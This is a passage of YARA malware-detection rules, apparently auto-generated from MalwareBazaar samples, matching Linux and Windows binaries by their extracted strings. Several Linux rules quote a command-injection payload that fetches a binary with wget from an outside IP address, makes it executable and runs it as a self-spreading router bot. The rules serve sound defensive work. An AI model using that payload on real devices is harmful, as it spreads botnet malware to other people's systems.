        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "busybox wget"
        $s4 = "/usr/libexec/openssh/sftp-server"
        $s5 = "shell"
        $s6 = "fdevalvex"
        $s7 = "wget-log"
        $s8 = "deexec"
        $s9 = "sefaexec"
        $s10 = "dakuexecbin"
        $s11 = "Execution"
        $s12 = "furasshu"
        $s13 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.178.235.18/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;"
        $s14 = "/usr/bin/shutdown"
        $s15 = "Exec format error"
        $s16 = "Resource temporarily unavailable"
        $s17 = "Multihop attempted"
        $s18 = "Attempting to link in too many shared libraries"
        $s19 = "Cannot exec a shared library directly"
        $s20 = "Socket operation on non-socket"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 142KB and
        all of them
}

rule Linux_beac5e5f1f0b8735f4937d9ebd0fbbb67dc1ab90ce4a09f0afbccda98820e600
{
    meta:
        description = "Auto ML: beac5e5f1f0b8735f4937d9ebd0fbbb67dc1ab90ce4a09f0afbccda98820e600"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "busybox wget"
        $s4 = "/usr/libexec/openssh/sftp-server"
        $s5 = "shell"
        $s6 = "fdevalvex"
        $s7 = "wget-log"
        $s8 = "deexec"
        $s9 = "sefaexec"
        $s10 = "dakuexecbin"
        $s11 = "Execution"
        $s12 = "furasshu"
        $s13 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.178.235.18/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;"
        $s14 = "/usr/bin/shutdown"
        $s15 = "Exec format error"
        $s16 = "Resource temporarily unavailable"
        $s17 = "Multihop attempted"
        $s18 = "Attempting to link in too many shared libraries"
        $s19 = "Cannot exec a shared library directly"
        $s20 = "Socket operation on non-socket"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 157KB and
        all of them
}

rule Linux_263b14beac8972ffcb8a07cb8515127101420721770253ba3b1e137b3dbbcbd6
{
    meta:
        description = "Auto ML: 263b14beac8972ffcb8a07cb8515127101420721770253ba3b1e137b3dbbcbd6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "busybox wget"
        $s4 = "/usr/libexec/openssh/sftp-server"
        $s5 = "shell"
        $s6 = "fdevalvex"
        $s7 = "wget-log"
        $s8 = "deexec"
        $s9 = "sefaexec"
        $s10 = "dakuexecbin"
        $s11 = "Execution"
        $s12 = "furasshu"
        $s13 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.178.235.18/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;"
        $s14 = "/usr/bin/shutdown"
        $s15 = "Exec format error"
        $s16 = "Resource temporarily unavailable"
        $s17 = "Multihop attempted"
        $s18 = "Attempting to link in too many shared libraries"
        $s19 = "Cannot exec a shared library directly"
        $s20 = "Socket operation on non-socket"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 194KB and
        all of them
}

rule Linux_f48bbc1c6f45c1a298bcda3c89c786ad97de498100f83b773c5f176233a40e5d
{
    meta:
        description = "Auto ML: f48bbc1c6f45c1a298bcda3c89c786ad97de498100f83b773c5f176233a40e5d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "busybox wget"
        $s4 = "/usr/libexec/openssh/sftp-server"
        $s5 = "shell"
        $s6 = "fdevalvex"
        $s7 = "wget-log"
        $s8 = "deexec"
        $s9 = "sefaexec"
        $s10 = "dakuexecbin"
        $s11 = "Execution"
        $s12 = "furasshu"
        $s13 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.178.235.18/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;"
        $s14 = "/usr/bin/shutdown"
        $s15 = "Exec format error"
        $s16 = "Resource temporarily unavailable"
        $s17 = "Multihop attempted"
        $s18 = "Attempting to link in too many shared libraries"
        $s19 = "Cannot exec a shared library directly"
        $s20 = "Socket operation on non-socket"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 145KB and
        all of them
}

rule Linux_c84313e450493e3197f551abd5dc491a61c2f18f3ab484f20a712b12ccfcdb8d
{
    meta:
        description = "Auto ML: c84313e450493e3197f551abd5dc491a61c2f18f3ab484f20a712b12ccfcdb8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "busybox wget"
        $s4 = "/usr/libexec/openssh/sftp-server"
        $s5 = "shell"
        $s6 = "fdevalvex"
        $s7 = "wget-log"
        $s8 = "deexec"
        $s9 = "sefaexec"
        $s10 = "dakuexecbin"
        $s11 = "Execution"
        $s12 = "furasshu"
        $s13 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.178.235.18/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;"
        $s14 = "/usr/bin/shutdown"
        $s15 = "Exec format error"
        $s16 = "Resource temporarily unavailable"
        $s17 = "Multihop attempted"
        $s18 = "Attempting to link in too many shared libraries"
        $s19 = "Cannot exec a shared library directly"
        $s20 = "Socket operation on non-socket"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 189KB and
        all of them
}

rule Linux_e699742af836bb610770228029c459b01e85d42fd01dc8a301eb4d9cae9792c4
{
    meta:
        description = "Auto ML: e699742af836bb610770228029c459b01e85d42fd01dc8a301eb4d9cae9792c4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "busybox wget"
        $s4 = "/usr/libexec/openssh/sftp-server"
        $s5 = "shell"
        $s6 = "fdevalvex"
        $s7 = "wget-log"
        $s8 = "deexec"
        $s9 = "sefaexec"
        $s10 = "dakuexecbin"
        $s11 = "Execution"
        $s12 = "furasshu"
        $s13 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.178.235.18/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;"
        $s14 = "/usr/bin/shutdown"
        $s15 = "Exec format error"
        $s16 = "Resource temporarily unavailable"
        $s17 = "Multihop attempted"
        $s18 = "Attempting to link in too many shared libraries"
        $s19 = "Cannot exec a shared library directly"
        $s20 = "Socket operation on non-socket"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 145KB and
        all of them
}

rule Linux_e890b4ece8be8eca2c075ef2856debc3be97e33c251e866e52c12f8ac45feddd
{
    meta:
        description = "Auto ML: e890b4ece8be8eca2c075ef2856debc3be97e33c251e866e52c12f8ac45feddd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuSNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "busybox wget"
        $s4 = "/usr/libexec/openssh/sftp-server"
        $s5 = "shell"
        $s6 = "fdevalvex"
        $s7 = "wget-log"
        $s8 = "deexec"
        $s9 = "sefaexec"
        $s10 = "dakuexecbin"
        $s11 = "Execution"
        $s12 = "furasshu"
        $s13 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.178.235.18/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;"
        $s14 = "/usr/bin/shutdown"
        $s15 = "Exec format error"
        $s16 = "Resource temporarily unavailable"
        $s17 = "Multihop attempted"
        $s18 = "Attempting to link in too many shared libraries"
        $s19 = "Cannot exec a shared library directly"
        $s20 = "Socket operation on non-socket"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 163KB and
        all of them
}

rule Linux_3dfdfc217fdec969d28a9c792b61e308c6b85f58ab5da3e688feeccf09130527
{
    meta:
        description = "Auto ML: 3dfdfc217fdec969d28a9c792b61e308c6b85f58ab5da3e688feeccf09130527"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "HOST: 255.255.255.255:1900"
        $s3 = "busybox wget"
        $s4 = "/usr/libexec/openssh/sftp-server"
        $s5 = "shell"
        $s6 = "fdevalvex"
        $s7 = "wget-log"
        $s8 = "deexec"
        $s9 = "sefaexec"
        $s10 = "dakuexecbin"
        $s11 = "Execution"
        $s12 = "furasshu"
        $s13 = "time1=00:00-00:00&time2=00:00-00:00&mac=;rm -rf mpsl;wget http://103.178.235.18/skyljne.mpsl; chmod 777 skyljne.mpsl; ./skyljne.mpsl lblink.selfrep;"
        $s14 = "/usr/bin/shutdown"
        $s15 = "Exec format error"
        $s16 = "Resource temporarily unavailable"
        $s17 = "Multihop attempted"
        $s18 = "Attempting to link in too many shared libraries"
        $s19 = "Cannot exec a shared library directly"
        $s20 = "Socket operation on non-socket"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 130KB and
        all of them
}

rule Windows_85914b238a5e984b8075c722ef7104172dd8dc53852fad4d8b29e3c3b165bae8
{
    meta:
        description = "Auto ML: 85914b238a5e984b8075c722ef7104172dd8dc53852fad4d8b29e3c3b165bae8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "C:\\Users\\aseca\\OneDrive\\Desktop\\FULL\\KartalPE\\KartalPE\\KartalPE\\bin\\Debug\\CryptoObfuscator_Output\\KartalPE.pdb"
        $s2 = "KartalPE.dll"
        $s3 = "kernel32.dll"
        $s4 = "ntdll.dll"
        $s5 = "user32.dll"
        $s6 = "DESCryptoServiceProvider"
        $s7 = "System.Security.Cryptography"
        $s8 = "ICryptoTransform"
        $s9 = "RegistrySettings"
        $s10 = "EditorToken"
        $s11 = "GroupLoader"
        $s12 = "LineToken"
        $s13 = "StreamToken"
        $s14 = "TemplateHelper"
        $s15 = "TemplateSite"
        $s16 = "SaveTemplate"
        $s17 = "syncObjectToken"
        $s18 = "namesToken"
        $s19 = "ProcessHandle"
        $s20 = "CreateDecryptor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 41KB and
        all of them
}

rule Windows_d8c5a13d192bd14b689755cefac59d3f78bea05526c50b8428655ff88568fc69
{
    meta:
        description = "Auto ML: d8c5a13d192bd14b689755cefac59d3f78bea05526c50b8428655ff88568fc69"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = " delete"
        $s2 = " delete[]"
        $s3 = "`placement delete closure'"
        $s4 = "`placement delete[] closure'"
        $s5 = "SHELL32.dll"
        $s6 = "GetTempPathW"
        $s7 = "KERNEL32.dll"
        $s8 = "DeleteCriticalSection"
        $s9 = "GetProcessHeap"
        $s10 = ":O:\\5pMT"
        $s11 = "+rrapIw"
        $s12 = "+x:\\3"
        $s13 = "apijj"
        $s14 = ":B:\\|"
        $s15 = "J:\\^+"
        $s16 = "Z:\\Hg"
        $s17 = ":HZ:\\."
        $s18 = "ASSSh&:U'"
        $s19 = "P:\\gB"
        $s20 = "I:\\4o/"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 49592KB and
        all of them
}

rule Windows_b5bf9b891fdd046d626082bad71ef887a9fcafca9cdfd6887d2e60ef6d4a0462
{
    meta:
        description = "Auto ML: b5bf9b891fdd046d626082bad71ef887a9fcafca9cdfd6887d2e60ef6d4a0462"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"
        $s2 = "239.255.255.250"
        $s3 = "HOST: 239.255.255.250:1900"
        $s4 = " xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\""
        $s5 = " SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
        $s6 = "<m:DeletePortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
        $s7 = "</m:DeletePortMapping>"
        $s8 = "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping\""
        $s9 = "bitcoincash:qr89hag2967ef604ud3lw4pq8hmn69n46czwdnx3ut"
        $s10 = "WS2_32.dll"
        $s11 = "SHLWAPI.dll"
        $s12 = "URLDownloadToFileW"
        $s13 = "urlmon.dll"
        $s14 = "InternetCrackUrlA"
        $s15 = "InternetOpenUrlA"
        $s16 = "InternetOpenUrlW"
        $s17 = "WININET.dll"
        $s18 = "ntdll.dll"
        $s19 = "msvcrt.dll"
        $s20 = "DeleteFileW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 81KB and
        all of them
}

rule Windows_6eadbbb4368eb760df9ccec6ea44a3d6b63c05f224738dc0e7c06db528ba85f8
{
    meta:
        description = "Auto ML: 6eadbbb4368eb760df9ccec6ea44a3d6b63c05f224738dc0e7c06db528ba85f8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "MSVCRT.dll"
        $s2 = "DeleteCriticalSection"
        $s3 = "KERNEL32.dll"
        $s4 = "ADVAPI32.dll"
        $s5 = "WSOCK32.dll"
        $s6 = "WS2_32.dll"
        $s7 = "%s: invalid URL"
        $s8 = "apr_socket_connect()"
        $s9 = "socket receive buffer"
        $s10 = "socket send buffer"
        $s11 = "socket nonblock"
        $s12 = "socket"
        $s13 = "apr_socket_recv"
        $s14 = " Licensed to The Apache Software Foundation, http://www.apache.org/<br>"
        $s15 = " Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/<br>"
        $s16 = "Licensed to The Apache Software Foundation, http://www.apache.org/"
        $s17 = "Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/"
        $s18 = "    -r              Don't exit on socket receive errors."
        $s19 = "                    are a colon separated username and password."
        $s20 = "                    'application/x-www-form-urlencoded'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 73KB and
        all of them
}

rule Windows_cff57eb324f603b69429380de8cb79ae9e56526f0bcb369fe727b733079f08bd
{
    meta:
        description = "Auto ML: cff57eb324f603b69429380de8cb79ae9e56526f0bcb369fe727b733079f08bd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "DeleteCriticalSection"
        $s4 = "user32.dll"
        $s5 = "oleaut32.dll"
        $s6 = "advapi32.dll"
        $s7 = "OpenProcessToken"
        $s8 = "LookupPrivilegeValueA"
        $s9 = "DeleteFileA"
        $s10 = "comctl32.dll"
        $s11 = "AdjustTokenPrivileges"
        $s12 = "    version=\"1.0.0.0\""
        $s13 = "            version=\"6.0.0.0\""
        $s14 = "            publicKeyToken=\"6595b64144ccf1df\""
        $s15 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>"
        $s16 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>"
        $s17 = "O:\\!["
        $s18 = "N:\\wx@#R"
        $s19 = "b9qd:\\"
        $s20 = "RXURl"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4670KB and
        all of them
}

rule Windows_789dcb2ef828eee82749c3ff3d08ac19d68ff06ad13ca1718c2ea47953775b3a
{
    meta:
        description = "Auto ML: 789dcb2ef828eee82749c3ff3d08ac19d68ff06ad13ca1718c2ea47953775b3a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
        $s2 = "239.255.255.250"
        $s3 = "HOST: 239.255.255.250:1900"
        $s4 = " xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\""
        $s5 = " SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
        $s6 = "<m:DeletePortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
        $s7 = "</m:DeletePortMapping>"
        $s8 = "SOAPAction: \"urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping\""
        $s9 = "bitcoincash:qr89hag2967ef604ud3lw4pq8hmn69n46czwdnx3ut"
        $s10 = "WS2_32.dll"
        $s11 = "SHLWAPI.dll"
        $s12 = "URLDownloadToFileW"
        $s13 = "urlmon.dll"
        $s14 = "InternetCrackUrlA"
        $s15 = "InternetOpenUrlA"
        $s16 = "InternetOpenUrlW"
        $s17 = "WININET.dll"
        $s18 = "ntdll.dll"
        $s19 = "msvcrt.dll"
        $s20 = "DeleteFileW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 80KB and
        all of them
}

rule Windows_ce1f3e928a5d4354494851b835fc7c879a54fcfc58ab77cc278a54c9b8d9b3ac
{
    meta:
        description = "Auto ML: ce1f3e928a5d4354494851b835fc7c879a54fcfc58ab77cc278a54c9b8d9b3ac"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "h:\\`e.)"
        $s2 = "ADVAPI32.dll"
        $s3 = "t<T:\\"
        $s4 = "Ny:\\y`D"
        $s5 = "USER32.dll"
        $s6 = "KERNEL32.dll"
        $s7 = "SHELL32.dll"
        $s8 = "ShellExecuteExW"
        $s9 = ")dapI"
        $s10 = "WXj:\\"
        $s11 = "urLiy"
        $s12 = "ole32.dll"
        $s13 = "DeleteCriticalSection"
        $s14 = ": :$:(:,:0:4:8:<:@:D:H:L:P:T:X:\\:`:d:h:l:p:t:x:|:"
        $s15 = "<:@:D:H:L:P:T:X:\\:`:d:h:l:p:t:x:|:"
        $s16 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\" />"
        $s17 = "             requestedExecutionLevel node with one of the following."
        $s18 = "        <requestedExecutionLevel  level=\"asInvoker\" uiAccess=\"false\" />"
        $s19 = "        <requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />"
        $s20 = "        <requestedExecutionLevel  level=\"highestAvailable\" uiAccess=\"false\" />"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5947KB and
        all of them
}

rule Windows_5291fa7572877a4450b128b5766a5c39d7831231dc9b33f269018fc6d60ca9d4
{
    meta:
        description = "Auto ML: 5291fa7572877a4450b128b5766a5c39d7831231dc9b33f269018fc6d60ca9d4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "vSSSh"
        $s2 = "An application has made an attempt to load the C runtime library incorrectly."
        $s3 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s4 = "- Attempt to initialize the CRT more than once."
        $s5 = "ADVAPI32.DLL"
        $s6 = "USER32.DLL"
        $s7 = "KERNEL32.dll"
        $s8 = "USER32.dll"
        $s9 = "DeleteCriticalSection"
        $s10 = "mscoree.dll"
        $s11 = "KERNEL32.DLL"
        $s12 = "91.5.67.27"
        $s13 = "32.89.78.29"
        $s14 = "Zigugafujubakiy wibodo!Guvapulag jumawavegifij yodumapim'Guvi refoze yahiviwogeb wogom reju bahaUSepasutemutul sarobositesunar pokubodazo zuhuk fori feres riya noxijamuci vivoyulocig"
        $s15 = "@Dijudur finakarili jevo pezafiwigu japihumeh gadujecomu roborefe.Mivuridovu hajacim viduzejimozeted vemu sijoho`Kahayubevigu jov wukidi kerobayucuwowa lotulaleduzoda zofexegusotopoh kapegivemepok yatezepizopa"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 223KB and
        all of them
}

rule Windows_b3926eda14e10469587385cceea81e13e27510bb9ed3a4e278b12acdb3dc084b
{
    meta:
        description = "Auto ML: b3926eda14e10469587385cceea81e13e27510bb9ed3a4e278b12acdb3dc084b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "shell32.dll"
        $s3 = "DeleteCriticalSection"
        $s4 = "user32.dll"
        $s5 = "oleaut32.dll"
        $s6 = "advapi32.dll"
        $s7 = "OpenProcessToken"
        $s8 = "LookupPrivilegeValueA"
        $s9 = "DeleteFileA"
        $s10 = "comctl32.dll"
        $s11 = "AdjustTokenPrivileges"
        $s12 = "    version=\"1.0.0.0\""
        $s13 = "            version=\"6.0.0.0\""
        $s14 = "            publicKeyToken=\"6595b64144ccf1df\""
        $s15 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>"
        $s16 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>"
        $s17 = "z:\\:<u"
        $s18 = "Heh:\\"
        $s19 = "wfkN:\\"
        $s20 = "|gM:\\"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4674KB and
        all of them
}

rule Windows_ffa977ca7c7f3939fa6b2ac86dfb4cf4585b0cca2ce311943653fda5ba19b617
{
    meta:
        description = "Auto ML: ffa977ca7c7f3939fa6b2ac86dfb4cf4585b0cca2ce311943653fda5ba19b617"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "?Hz:\\"
        $s2 = "o:\\L#lXo"
        $s3 = "bml:\\"
        $s4 = "ADVAPI32.dll"
        $s5 = "api-ms-win-crt-heap-l1-1-0.dll"
        $s6 = "api-ms-win-crt-locale-l1-1-0.dll"
        $s7 = "api-ms-win-crt-math-l1-1-0.dll"
        $s8 = "api-ms-win-crt-runtime-l1-1-0.dll"
        $s9 = "api-ms-win-crt-stdio-l1-1-0.dll"
        $s10 = "api-ms-win-crt-string-l1-1-0.dll"
        $s11 = "bcrypt.dll"
        $s12 = "KERNEL32.DLL"
        $s13 = "ole32.dll"
        $s14 = "https://sectigo.com/CPS0"
        $s15 = "3http://crl.sectigo.com/SectigoRSATimeStampingCA.crl0t"
        $s16 = "3http://crt.sectigo.com/SectigoRSATimeStampingCA.crt0#"
        $s17 = "http://ocsp.sectigo.com0"
        $s18 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v"
        $s19 = "3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%"
        $s20 = "http://ocsp.usertrust.com0"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 679KB and
        all of them
}

rule Windows_21f0def099c99108487904a4198180d65de4d64de7eac95d12972d14ff1df95f
{
    meta:
        description = "Auto ML: 21f0def099c99108487904a4198180d65de4d64de7eac95d12972d14ff1df95f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "user32.dll"
        $s3 = "gdi32.dll"
        $s4 = "advapi32.dll"
        $s5 = "shell32.dll"
        $s6 = "ole32.dll"
        $s7 = "ntdll.dll"
        $s8 = "winmm.dll"
        $s9 = "OpenProcessToken"
        $s10 = "@Registry@initialization$qqrv"
        $s11 = "@Dwmapi@initialization$qqrv"
        $s12 = "@Mapi@initialization$qqrv"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 133KB and
        all of them
}

rule Windows_2b3fbb77e5ed29f7ffbcb9a73cc1e467aed6447fcaf28a47d50f78c81fa17eaf
{
    meta:
        description = "Auto ML: 2b3fbb77e5ed29f7ffbcb9a73cc1e467aed6447fcaf28a47d50f78c81fa17eaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "RLoSSh"
        $s2 = "r:\\B`"
        $s3 = "ADVAPI32.dll"
        $s4 = "api-ms-win-crt-heap-l1-1-0.dll"
        $s5 = "api-ms-win-crt-locale-l1-1-0.dll"
        $s6 = "api-ms-win-crt-math-l1-1-0.dll"
        $s7 = "api-ms-win-crt-runtime-l1-1-0.dll"
        $s8 = "api-ms-win-crt-stdio-l1-1-0.dll"
        $s9 = "api-ms-win-crt-string-l1-1-0.dll"
        $s10 = "bcrypt.dll"
        $s11 = "KERNEL32.DLL"
        $s12 = "ole32.dll"
        $s13 = "https://sectigo.com/CPS0"
        $s14 = "3http://crl.sectigo.com/SectigoRSATimeStampingCA.crl0t"
        $s15 = "3http://crt.sectigo.com/SectigoRSATimeStampingCA.crt0#"
        $s16 = "http://ocsp.sectigo.com0"
        $s17 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v"
        $s18 = "3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%"
        $s19 = "http://ocsp.usertrust.com0"
        $s20 = "8.32.831.12"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 679KB and
        all of them
}

rule Windows_123af47f65da365781dfbd0c5c2fef798c13c813d8b065faec991c841c407c46
{
    meta:
        description = "Auto ML: 123af47f65da365781dfbd0c5c2fef798c13c813d8b065faec991c841c407c46"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "@Madbasic@TICustomBasicList@DeleteItem$qqri"
        $s2 = "@Madgraphics@Draw$qqruiuip16Graphics@TBitmapiiii24Madgraphics@TGrayPercentui27Madgraphics@TStretchQuality"
        $s3 = "@Madres@DeleteIconGroupResourceW$qqsuipbus"
        $s4 = "@Madstrings@DeleteR$qqrr20System@UnicodeStringui"
        $s5 = "@Madstrings@DeleteR$qqrr27System@%AnsiStringT$us$i0$%ui"
        $s6 = "@Madstrings@RetDelete$qqrx20System@UnicodeStringuiui"
        $s7 = "@Madstrings@RetDelete$qqrx27System@%AnsiStringT$us$i0$%uiui"
        $s8 = "@Madstrings@RetDeleteR$qqrx20System@UnicodeStringui"
        $s9 = "@Madstrings@RetDeleteR$qqrx27System@%AnsiStringT$us$i0$%ui"
        $s10 = "kernel32.dll"
        $s11 = "user32.dll"
        $s12 = "gdi32.dll"
        $s13 = "version.dll"
        $s14 = "comctl32.dll"
        $s15 = "@Registry@initialization$qqrv"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 91KB and
        all of them
}

rule Windows_26baf66956c419f6346089bb655eaeb47ff4f605156f771ed9164cdba6458bc2
{
    meta:
        description = "Auto ML: 26baf66956c419f6346089bb655eaeb47ff4f605156f771ed9164cdba6458bc2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kernel32.dll"
        $s2 = "user32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 29KB and
        all of them
}

rule Windows_cad66abae32e9de58d1538c7a992a350661f5a7d5c4774605c75183a038c8a08
{
    meta:
        description = "Auto ML: cad66abae32e9de58d1538c7a992a350661f5a7d5c4774605c75183a038c8a08"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "hWaPi"
        $s2 = "=rsshM"
        $s3 = "ADVAPI32.dll"
        $s4 = "api-ms-win-crt-heap-l1-1-0.dll"
        $s5 = "api-ms-win-crt-locale-l1-1-0.dll"
        $s6 = "api-ms-win-crt-math-l1-1-0.dll"
        $s7 = "api-ms-win-crt-runtime-l1-1-0.dll"
        $s8 = "api-ms-win-crt-stdio-l1-1-0.dll"
        $s9 = "api-ms-win-crt-string-l1-1-0.dll"
        $s10 = "bcrypt.dll"
        $s11 = "KERNEL32.DLL"
        $s12 = "ole32.dll"
        $s13 = "https://sectigo.com/CPS0"
        $s14 = "3http://crl.sectigo.com/SectigoRSATimeStampingCA.crl0t"
        $s15 = "3http://crt.sectigo.com/SectigoRSATimeStampingCA.crt0#"
        $s16 = "http://ocsp.sectigo.com0"
        $s17 = "?http://crl.usertrust.com/USERTrustRSACertificationAuthority.crl0v"
        $s18 = "3http://crt.usertrust.com/USERTrustRSAAddTrustCA.crt0%"
        $s19 = "http://ocsp.usertrust.com0"
        $s20 = "5.88.390.42"
    condition:
        uint32(0) == 0x00905a4d and
